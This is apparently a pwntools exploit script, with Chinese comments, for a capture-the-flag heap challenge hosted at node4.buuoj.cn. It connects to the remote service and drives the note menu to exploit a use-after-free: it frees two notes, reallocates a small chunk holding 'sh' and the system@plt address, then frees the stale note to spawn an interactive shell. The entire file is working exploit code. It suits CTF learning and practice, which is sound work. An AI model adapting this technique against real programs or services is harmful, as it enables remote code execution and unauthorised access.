from pwn import *

# 又是喜闻乐见的堆题=。=
# 这题环境是ubuntu18，所以是有tcache的

# 思路应该是改写free@got，然后写入/bin/sh，然后执行free操作
context(os='linux', arch='i386')
# context.log_level = 'debug'
p = remote('node4.buuoj.cn', 25828)
# 人傻了，看了大佬的wp之后又发现思路很简单，就是UAF漏洞

def cmd(command: int):
    p.sendlineafter(b'CNote > ', str(command).encode())

def new_note(index: int, typ: int, size: int, content: bytes):
    '''
    type为2时size才有用
    '''
    cmd(1)
    p.sendlineafter(b'Index > ', str(index).encode())
    p.sendlineafter(b'Type > ', str(typ).encode())
    if typ == 1:
        p.sendlineafter(b'Value > ', content)
    elif typ == 2:
        p.sendlineafter(b'Length > ', str(size).encode())
        p.sendlineafter(b'Value > ', content)
    else:
        cmd(5)

def del_note(index: int):
    cmd(2)
    p.sendlineafter(b'Index > ', str(index).encode())

def dump_note(index: int):
    cmd(3)
    p.sendlineafter(b'Index > ', str(index).encode())

system_plt = 0x8048500
new_note(0, 2, 0x80, b'test')
new_note(1, 2, 0x80, b'test')
del_note(0)
del_note(1)

# 32位，只有4字节，所以只能写'sh\x00\x00'
new_note(2, 2, 0xc, b'sh\x00\x00'+p32(system_plt))
del_note(0)
p.interactive()